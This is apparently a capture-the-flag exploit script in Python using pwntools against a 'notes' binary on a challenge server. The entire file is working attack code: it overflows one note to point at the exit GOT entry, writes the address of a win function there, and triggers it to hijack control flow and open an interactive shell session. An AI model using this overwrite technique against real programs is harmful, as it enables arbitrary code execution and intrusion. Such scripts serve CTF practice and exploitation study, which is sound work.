#!/usr/bin/env python3

from pwn import *

exe = ELF("./notes_patched")

context.binary = exe


def conn():
    #r = process([exe.path])
    r = remote("challs.tfcctf.com", 31572)
    return r


r = conn()
def add(index):
    r.recv()
    r.sendline("1")
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(b"AA")

def edit(index, content):
    r.recv()
    r.sendline("2")
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(content)

def main():
    
    add(0)
    add(1)
    edit(0, b"A"*0x20 + p64(exe.got["exit"]))
    edit(1, p64(exe.sym.win))
    
    r.sendline("0")

    r.interactive()


if __name__ == "__main__":
    main()
